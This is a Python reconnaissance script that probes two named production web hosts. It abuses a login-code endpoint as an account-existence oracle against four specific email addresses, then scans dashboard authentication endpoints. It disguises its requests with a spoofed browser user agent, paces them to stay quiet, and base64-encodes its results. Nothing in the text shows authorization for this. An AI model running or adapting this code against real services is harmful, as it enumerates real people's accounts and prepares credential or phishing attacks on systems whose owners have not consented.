#!/usr/bin/env python3
# i28832 round c: login-code existence oracle on prod (403 not_member -> no message, 200/403 disabled -> account exists)
import os, json, time, base64, subprocess, re
HOST_PROD = "assistant.lumiiai.cn"; HOST_DASH = "dashboard.lumiiai.cn"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
T0 = time.time(); OUT = "/tmp/i28832c"; os.makedirs(OUT, exist_ok=True); _h = [0]
def el(): return int(time.time() - T0)
def b64(s): return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v):
    s = v if isinstance(v, str) else json.dumps(v, ensure_ascii=False, default=str)
    print("R:%s:%s" % (k, b64(s)), flush=True)
def curl(args, timeout=40):
    try:
        r = subprocess.run(["curl", "-s", "-k", "-m", str(timeout)] + args, capture_output=True, timeout=timeout + 15)
        return r.returncode, r.stdout, r.stderr
    except Exception as e:
        return -1, b"", repr(e).encode()
def req(host, method, path, body=None, timeout=40):
    bodyf = os.path.join(OUT, "b.%d" % _h[0]); _h[0] += 1
    url = "https://%s%s" % (host, path)
    args = ["--http2", "-A", UA, "-o", bodyf, "-H", "Accept: application/json, text/plain, */*",
            "-H", "Referer: https://%s/" % host, "-H", "Origin: https://%s" % host, "-w", "%{http_code}"]
    if body is not None:
        args += ["-X", method, "-H", "Content-Type: application/json", "--data-binary", body if isinstance(body, str) else json.dumps(body)]
    args.append(url)
    rc, out, err = curl(args, timeout=timeout)
    try: b = open(bodyf, "rb").read().decode("utf-8", "replace")
    except Exception: b = ""
    return {"code": out.decode(errors="replace").strip()[:3], "body": b, "err": err.decode()[:120]}

# existence oracle: /api/auth/code (single attempt each; 403 not_member = no message sent)
targets = ["admin@lumii-ai.cn", "admin@lumii.dev", "brian@aro.network", "lc-zone-leader@lumii.dev"]
rows = []
for ident in targets:
    r = req(HOST_PROD, "POST", "/api/auth/code", {"identifier": ident})
    rows.append({"ident": ident, "code": r["code"], "body": r["body"][:200]})
    print("CODE %s -> %s %s" % (ident, r["code"], r["body"][:120]), flush=True)
    time.sleep(2)
R("PROD_CODE_ORACLE", rows)

# dashboard: probe common next-api auth paths for capability
for p in ("/api/auth/methods", "/api/auth/session", "/api/session", "/api/auth/me", "/api/health", "/api/auth/code"):
    r = req(HOST_DASH, "POST" if p.endswith("code") else "GET", p, {"identifier": "x@y.z"} if p.endswith("code") else None)
    R("DASH_%s" % re.sub(r'[^A-Za-z0-9]+', '_', p), {"code": r["code"], "body": r["body"][:220]})
    time.sleep(1)
R("DONE", {"t": el()})
